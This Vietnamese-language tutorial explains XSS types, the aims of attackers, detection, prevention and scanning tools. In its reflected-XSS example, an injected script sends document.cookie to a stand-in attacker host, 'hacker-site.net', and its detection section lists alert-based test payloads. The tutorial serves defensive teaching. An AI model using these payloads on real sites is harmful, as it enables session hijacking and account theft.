## XSS là gì?
XSS, hay Cross-site scripting, là một loại lỗ hổng bảo mật web phổ biến cho phép kẻ tấn công chèn mã độc (thường là JavaScript) vào các trang web mà người dùng tin tưởng. Khi người dùng truy cập vào trang web bị nhiễm, mã độc sẽ được thực thi trong trình duyệt của họ, có khả năng đánh cắp thông tin nhạy cảm, thay đổi nội dung trang web, hoặc thậm chí chiếm quyền điều khiển hoàn toàn trình duyệt. 
Kẻ tấn công có thể sử dụng lỗ hổng XSS để ăn cắp cookie, chiếm đoạt tài khoản, thực hiện ActiveX, thực thi Flash content, lừa người dùng tải phần mềm… Các vụ tấn công lừa đảo thường khai thác lỗ hổng XSS để giả mạo là các website hợp pháp.
## Nguyên lý hoạt động của lỗ hổng XSS 
Mô hình chung của lỗ hổng XSS:
Để thực hiện tấn công XSS,kẻ tấn công sẽ lợi dụng các lỗ hổng bảo mật của trang web để chèn mã độc vào dữ liệu đầu vào, nơi mà hệ thống cho phép người dùng nhập và lưu trữ các đoạn mã độc, sau đó dữ liệu này được hiển thị trên trang web mà không được kiểm tra hoặc xử lý đúng cách . Mỗi khi người dùng tải trang về, thì các đoạn mã độc này sẽ được thực thi ở phía trình duyệt của người dùng.
Ta nhận thấy, để một lỗi XSS xảy ra, phải bao gồm 2 quá trình:
* Thứ 1: Kẻ tấn công chèn các đoạn mã độc vào hệ thống web
* Thứ 2: Người dùng truy cập vào trang web
<img width="922" height="543" alt="image" src="https://github.com/user-attachments/assets/0271e966-2343-4757-ab87-a1a164524839" />

Chú ý rằng, tấn công XSS sẽ không thể xảy ra được nếu như người dùng không thực sự truy cập vào hệ thống web. Điều này có nghĩa là dữ liệu lưu ở Cơ sở dữ liệu phía Server vẫn an toàn mặc dù mã độc đã được chèn vào hệ thống. Mục tiêu mà XSS nhắm tới là thực thi mã độc ở phía trình duyệt, nhằm đánh cắp dữ liệu ở phía người dùng (ví dụ: cookies) để có thông tin chứng thực user khi truy cập trái phép vào hệ thống.
## Phân loại lỗ hổng XSS
XSS là loại tấn công thường sử dụng Javascript và HTML để chèn vào trang web. Cách tấn công này có thể được thực hiện theo nhiều cách khác nhau, phụ thuộc vào loại tấn công XSS, những mã độc có thể được phản chiếu trên trình duyệt của nạn nhân hoặc được lưu trữ trong cơ sở dữ liệu và được chạy mỗi khi người dùng gọi hình thức tấn công thích hợp. Có một số hình thức tấn công XSS có thể xảy ra như:
* Cross Site Scripting có thể xảy ra trên tập lệnh độc hại được thực hiện ở phía client.
* Trang web hoặc form giả mạo được hiển thị cho người dùng (nơi nạn nhân nhập thông tin đăng nhập hoặc nhấp vào liên kết độc hại).
* Trên các trang web có quảng cáo được hiển thị.
* Email độc hại được gửi đến nạn nhân. Tấn công xảy ra khi tin tặc tìm kiếm những lỗ hổng trên website và gửi nó làm đầu vào độc hại. Tập lệnh độc hại được tiêm vào mã lệnh và sau đó được gửi dưới dạng đầu ra cho người dùng cuối cùng.
 + Có 3 loại tấn công XSS chính như sau:
### 1. Reflected XSS
Có nhiều hướng để khai thác thông qua lỗi Reflected XSS, một trong những cách được biết đến nhiều nhất là chiếm phiên làm việc (session) của người dùng, từ đó có thể truy cập được dữ liệu và chiếm được quyền của họ trên website. Chi tiết được mô tả qua những bước sau:
<img width="876" height="535" alt="image" src="https://github.com/user-attachments/assets/456248ac-aebb-46ba-a388-80cee08dc8ee" />

1. Người dùng đăng nhập web và giả sử được gán session:
Set-Cookie: sessId=5e2c648fa5ef8d653adeede595dcde6f638639e4e59d4
2. Bằng cách nào đó, hacker gửi được cho người dùng URL:
http://example.com/name=var+i=new+Image;+i.src=”http://hacker-site.net/”%2Bdocument.cookie;
Giả sử example.com là website nạn nhân truy cập, hacker-site.net là trang của hacker tạo ra
3. Nạn nhân truy cập đến URL trên
4. Server phản hồi cho nạn nhân, kèm với dữ liệu có trong request (đoạn javascript của hacker)
5. Trình duyệt nạn nhân nhận phản hồi và thực thi đoạn javascript
6. Đoạn javascript mà hacker tạo ra thực tế như sau:
var i=new Image; i.src=”http://hacker-site.net/”+document.cookie;
Dòng lệnh trên bản chất thực hiện request đến site của hacker với tham số là cookie người dùng:
GET /sessId=5e2c648fa5ef8d653adeede595dcde6f638639e4e59d4 HTTP/1.1
Host: hacker-site.net
7. Từ phía site của mình, hacker sẽ bắt được nội dung request trên và coi như session của người dùng sẽ bị chiếm. Đến lúc này, hacker có thể giả mạo với tư cách nạn nhân và thực hiện mọi quyền trên website mà nạn nhân có.
### 2. Stored XSS:
Khác với Reflected tấn công trực tiếp vào một số nạn nhân mà hacker nhắm đến, Stored XSS hướng đến nhiều nạn nhân hơn. Lỗi này xảy ra khi ứng dụng web không kiểm tra kỹ các dữ liệu đầu vào trước khi lưu vào cơ sở dữ liệu (ở đây tôi dùng khái niệm này để chỉ database, file hay những khu vực khác nhằm lưu trữ dữ liệu của ứng dụng web). Ví dụ như các form góp ý, các comment … trên các trang web. Với kỹ thuật Stored XSS , hacker không khai thác trực tiếp mà phải thực hiện tối thiểu qua 2 bước.
Đầu tiên hacker sẽ thông qua các điểm đầu vào (form, input, textarea…) không được kiểm tra kỹ để chèn vào CSDL các đoạn mã nguy hiểm.
<img width="567" height="529" alt="image" src="https://github.com/user-attachments/assets/e3f4f062-a2b1-4954-b6c8-64be59b7139c" />

Tiếp theo, khi người dùng truy cập vào ứng dụng web và thực hiện các thao tác liên quan đến dữ liệu được lưu này, đoạn mã của hacker sẽ được thực thi trên trình duyệt người dùng.
<img width="976" height="237" alt="image" src="https://github.com/user-attachments/assets/6be37748-9578-4a38-8071-1a2bebfa9d26" />

Kịch bản khai thác:
<img width="998" height="576" alt="image" src="https://github.com/user-attachments/assets/6619d73f-10ea-4d29-9689-ab70e46b5025" />

Reflected XSS và Stored XSS có 2 sự khác biệt lớn trong quá trình tấn công.
* Thứ nhất, để khai thác Reflected XSS, hacker phải lừa được nạn nhân truy cập vào URL của mình. Còn Stored XSS không cần phải thực hiện việc này, sau khi chèn được mã nguy hiểm vào CSDL của ứng dụng, hacker chỉ việc ngồi chờ nạn nhân tự động truy cập vào. Với nạn nhân, việc này là hoàn toàn bình thường vì họ không hề hay biết dữ liệu mình truy cập đã bị nhiễm độc.
* Thứ 2, mục tiêu của hacker sẽ dễ dàng đạt được hơn nếu tại thời điểm tấn công nạn nhân vẫn trong phiên làm việc(session) của ứng dụng web. Với Reflected XSS, hacker có thể thuyết phục hay lừa nạn nhân đăng nhập rồi truy cập đến URL mà hắn ta cung cấp để thực thi mã độc. Nhưng Stored XSS thì khác, vì mã độc đã được lưu trong CSDL Web nên bất cứ khi nào người dùng truy cập các chức năng liên quan thì mã độc sẽ được thực thi, và nhiều khả năng là những chức năng này yêu cầu phải xác thực(đăng nhập) trước nên hiển nhiên trong thời gian này người dùng vẫn đang trong phiên làm việc.
Từ những điều này có thể thấy Stored XSS nguy hiểm hơn Reflected XSS rất nhiều, đối tượng bị ảnh hưởng có thế là tất cả nhưng người sử dụng ứng dụng web đó. Và nếu nạn nhân có vai trò quản trị thì còn có nguy cơ bị chiếm quyền điều khiển web.
### 3. DOM Based XSS
DOM Based XSS là kỹ thuật khai thác XSS dựa trên việc thay đổi cấu trúc DOM của tài liệu, cụ thể là HTML. Chúng ta cùng xem xét một ví dụ cụ thể sau.
Một website có URL đến trang đăng ký như sau:
http://example.com/register.php?message=Please fill in the form
Khi truy cập đến thì chúng ta thấy một Form rất bình thường
<img width="496" height="193" alt="image" src="https://github.com/user-attachments/assets/8fd35407-6ecd-4a0a-8610-bc9524a7c881" />

Thay vì truyền "message=Please fill in the form" thì truyền message=<label>Gender</label>
<select class = "form-control" onchange="java_script_:show()"><option value="Male">Male</option><option value="Female">Female</option></select>
<script>function show(){alert();}</script>
Khi đấy form đăng ký sẽ trở thành như thế này:
<img width="477" height="201" alt="image" src="https://github.com/user-attachments/assets/a747c78d-e63c-424f-a0c4-c0a0ddc32d34" />

Người dùng sẽ chẳng chút nghi ngờ với một form “bình thường” như thế này, và khi lựa chọn giới tính, Script sẽ được thực thi
<img width="777" height="208" alt="image" src="https://github.com/user-attachments/assets/bf33bd23-a707-4a77-b336-28ad66da7c0f" />

Kịch bản tấn công:
<img width="771" height="439" alt="image" src="https://github.com/user-attachments/assets/adb5129a-af1f-4af1-8748-cfbcc512c3fb" />

## Mục đích của việc tấn công XSS 
Mục đích của việc tấn công này thường xoay quanh việc lợi dụng lỗ hổng bảo mật để thực hiện các hành vi trái phép, gây hại cho người dùng và hệ thống. Cụ thể như:

### Đánh cắp thông tin nhạy cảm

Kẻ tấn công có thể sử dụng XSS để đánh cắp dữ liệu nhạy cảm của người dùng, chẳng hạn như:

Cookie: Cookie thường chứa thông tin xác thực người dùng, phiên làm việc, hoặc dữ liệu quan trọng. Bằng cách sử dụng XSS để đánh cắp cookie, kẻ tấn công có thể giả mạo danh tính hoặc chiếm quyền truy cập vào tài khoản của nạn nhân.
Thông tin cá nhân: Các loại tấn công này có thể được sử dụng để thu thập thông tin cá nhân như tên, địa chỉ email, hoặc số điện thoại khi người dùng nhập liệu vào trang web.
Chiếm quyền kiểm soát tài khoản

Bằng cách lợi dụng XSS, kẻ tấn công có thể chiếm quyền kiểm soát tài khoản người dùng trên trang web. Khi đã có được cookie phiên làm việc hoặc thông tin xác thực, chúng có thể đăng nhập thay nạn nhân và thực hiện các hành vi trái phép như thay đổi thông tin tài khoản, thực hiện chuyển tiền, hoặc xóa dữ liệu.

### Lây nhiễm mã độc

Hacker có thể chèn các mã độc hoặc liên kết độc hại thông qua XSS. Khi người dùng vô tình nhấp vào liên kết hoặc mã độc đó, nó có thể tải về và lây nhiễm phần mềm độc hại (malware) lên máy tính hoặc thiết bị di động của người dùng, dẫn đến mất kiểm soát thiết bị hoặc rò rỉ thông tin.

### Phá hoại giao diện người dùng (UI Defacement)

Kẻ tấn công có thể thay đổi giao diện trang web, làm gián đoạn trải nghiệm của người dùng, hoặc thậm chí đưa ra các thông điệp cảnh báo giả mạo nhằm lừa đảo (ví dụ: yêu cầu người dùng cung cấp thông tin thẻ tín dụng).

### Tấn công người dùng khác

XSS có thể được sử dụng như một phương tiện để tấn công người dùng khác của trang web. Ví dụ, kẻ tấn công có thể tạo một trang web giả mạo hoặc gửi liên kết độc hại cho người dùng, dụ họ thực hiện hành vi trái phép hoặc gửi thông tin nhạy cảm cho kẻ tấn công.

### Khai thác lỗ hổng của hệ thống

Đây có thể là bước đầu tiên trong một cuộc tấn công lớn hơn nhằm khai thác các lỗ hổng khác của hệ thống. Ví dụ, kẻ tấn công có thể lợi dụng XSS để xâm nhập vào hệ thống và phát hiện thêm các lỗ hổng bảo mật khác và nhắm tới các quyền truy cập cao hơn.
## Cách phát hiện lỗ hổng XSS
### Phát hiện lỗ hổng XSS bằng thủ công
Kiểm tra thủ công giúp hiểu rõ hơn về ứng dụng và có thể phát hiện những lỗ hổng tinh vi mà công cụ tự động bỏ sót. Cách kiểm tra thủ công thường tập trung vào các trường đầu vào của người dùng.

Các bước kiểm tra thủ công:

* Xác định các điểm đầu vào: Tìm kiếm các trường nhập liệu như input search, commentlogin, feedback, profile update...
* Chèn các chuỗi thử nghiệm XSS: Tại các điểm đầu vào, chèn mã JavaScript thử nghiệm để kiểm tra xem có thực thi hay không. Ví dụ:
  "><script>alert(‘XSS’)</script>
<img src=x onerror=alert(‘XSS’)>"
* Theo dõi phản hồi của ứng dụng và quan sát thông tin trả về: Nếu mã JavaScript được thực thi và hiển thị, thì ứng dụng đang tồn tại lỗ hổng XSS. Ví dụ như:
+ Nếu như mã có xuất hiện trong phần body html và phản hồi ngay thì ta có thể nghi ngờ và kiểm tra lỗi liên quan đến Reflected XSS.
+ Nếu xuất hiện lại trong phần header thì kiểm tra các lỗi liên quan đến HTTP Header Injection.
+ Trường hợp trong phần body xuất hiện giá trị mà đã gửi lên trong yêu cầu thì thử xem có thể thực thi được JavaScript bằng cách chèn các thẻ <script></script>.

* Kiểm tra các tình huống phức tạp: Kiểm tra các biến thể phức tạp hơn của XSS như DOM-based XSS, nơi các tập lệnh được thực thi trực tiếp từ phía trình duyệt Các tính huống phức tạp như:
## Cách ngăn chặn lỗ hổng
Mặc dù loại tấn công này được coi là một trong những loại nguy hiểm và rủi ro nhất, nhưng vẫn nên chuẩn bị một kế hoạch ngăn ngừa. Bởi vì sự phổ biến của cuộc tấn công này, có khá nhiều cách để ngăn chặn nó.
Các phương pháp phòng ngừa chính được sử dụng phổ biến bao gồm:
* Data validation
* Filtering
* Escaping
Bước đầu tiên trong công tác phòng chống tấn công này là Xác thực đầu vào. Mọi thứ, được nhập bởi người dùng phải được xác thực chính xác, bởi vì đầu vào của người dùng có thể tìm đường đến đầu ra. Xác thực dữ liệu có thể được đặt tên làm cơ sở để đảm bảo tính bảo mật của hệ thống. Tôi sẽ nhắc nhở rằng ý tưởng xác thực không cho phép đầu vào không phù hợp. Vì vậy nó chỉ giúp giảm thiểu rủi ro, nhưng có thể không đủ để ngăn chặn lỗ hổng XSS có thể xảy ra.
Một phương pháp ngăn chặn tốt khác là lọc đầu vào của người dùng. Ý tưởng lọc là tìm kiếm các từ khóa nguy hiểm trong mục nhập của người dùng và xóa chúng hoặc thay thế chúng bằng các chuỗi trống. Những từ khóa đó có thể là:
Thẻ <script> </ script>
Lệnh Javascript
Đánh dấu HTML
Lọc đầu vào khá dễ thực hành. Nó có thể được thực hiện theo nhiều cách khác nhau. Như:
Bởi các developers đã viết mã phía server.
Thư viện ngôn ngữ lập trình thích hợp đang được sử dụng.
Trong trường hợp này, một số developer viết mã riêng của họ để tìm kiếm các từ khóa thích hợp và xóa chúng. Tuy nhiên, cách dễ dàng hơn là chọn thư viện ngôn ngữ lập trình thích hợp để lọc đầu vào của người dùng. Tôi muốn lưu ý rằng việc sử dụng thư viện là một cách đáng tin cậy hơn, vì các thư viện đó đã được nhiều nhà phát triển sử dụng và thử nghiệm.
Một phương pháp phòng ngừa khác có thể là ký tự Escape. Trong thực tế này, các ký tự thích hợp đang được thay đổi bằng các mã đặc biệt.
Ví dụ: <ký tự Escape có thể giống như & # 60. Điều quan trọng cần biết là chúng ta có thể tìm thấy các thư viện thích hợp với ký tự escape.
Trong khi đó, việc kiểm thử tốt cũng không nên quên điều đó. Chúng ta cần những kiểm thử phần mềm có kiến thức tốt và những công cụ kiểm thử phần mềm đáng tin cậy. Bằng cách này, chất lượng phần mềm sẽ được bảo đảm tốt hơn.
## Tìm hiểu công cụ hỗ trợ phát hiện XSS
### 1. CyStack Platform – A Web Security Platform

CyStack là một nền tảng nền tảng an ninh mạng đầu tiên tại Việt Nam, CyStack Platform đã bao gồm 04 apps, cung cấp các tính năng bảo vệ cho website của bạn bao gồm: các công cụ quét lỗ hổng bảo mật ứng dụng web, công cụ giám sát an ninh liên tục, tưởng lửa ứng dụng web và truy tìm mã độc.
* CyStack Scanning: tự động phát hiện các lỗ hổng và đưa ra phương án khắc phục cho bạn.
* CyStack Monitoring: giúp bạn phát hiện sớm các vấn đề trên website của mình để có biện pháp khắc phục sớm nhất.
* CyStack Protecting: là một giải pháp tường lửa (Cloud web application firewall) đứng giữa website và người truy cập để chủ động ngăn chặn tất cả các cuộc tấn công từ bên ngoài.
* CyStack Responding: được xây dựng như một phần mềm diệt virus giúp bạn nhanh chóng phát hiện các dữ liệu độc hại và làm sạch website của mình.

### 2. Phần mềm Burp Suite Free
Burp Suite là một bộ công cụ quét lỗ hổng bảo mật cho ứng dụng web. Người dùng có thể trải nghiệm phiên bản miễn phí với các tính năng giới hạn hoặc trả phí với đầy đủ tính năng. Burpsuite là một nền tảng tích hợp cho việc kiểm tra an ninh các ứng dụng web. Các công cụ đa dạng làm việc hoàn hảo với nhau để hỗ trợ toàn bộ quá trình thử nghiệm, từ lập bản đồ ban đầu đến việc tìm kiếm và khai thác lỗ hổng bảo mật.

### 3. Phần mềm Netsparker
Được thiết kể để hỗ trợ cho cả việc phát hiện và khai thác các lỗ hổng. Mục tiêu Netsparker hướng tới là cho người dùng một kết quả chính xác nhất. Để đảm bảo tính xác thực của kết quả, thì công cụ này chỉ báo cáo về các lỗ hổng đã xác định được sau khi khai thác thành công hoặc thử nghiệm chúng. Netsparker sẽ phát hiện và báo cáo về các lỗ hổng như SQL Injection và Cross-site Scripting (XSS) trong tất cả các loại ứng dụng web, dựa trên bất kể nền tảng và công nghệ nào mà web được xây dựng.

### 4. Arachni
Arachni là một Ruby framework với đầy đủ tính năng, modular và hiệu suất cao nhằm mục đích giúp các nhà kiểm tra và quản trị viên thâm nhập đánh giá tính bảo mật của ứng dụng web. Arachni thể hiện sự thông minh qua việc có thể tự đào tạo bản thân bằng cách kiểm tra và học hỏi từ các hành động của ứng dụng web trong quá trình scan. Không chỉ vậy Arachni còn thực hiện phân tích meta bằng một số yếu tố để đánh giá độ tin cậy của kết quả tìm được để tránh cho ra các kết quả sai.

### 5. Phần mềm W3af
W3af (Web Application Attack and Audit Framework) là một web scanner mã nguồn mở. Web scanner này cung cấp một công cụ quét và khai thác lỗ hổng cho các ứng dụng web. W3af được viết bằng ngôn ngữ Python và có sẵn cho nhiều hệ điều hành phổ biến khác như Microsoft Windows, Linux, Mac OS X, FreeBSD và OpenBSD.
W3af được chia thành hai phần chính, đó là core và các plug-in. Bộ quét lỗ hổng xác định hầu hết các lỗ hổng trong ứng dụng web bằng cách sử dụng hơn 130 plug-in. Phần core kết hợp với các quy trình và đưa ra các tính năng dựa trên plug-in. Để từ đó tìm ra các lỗ hổng và khai thác chúng.








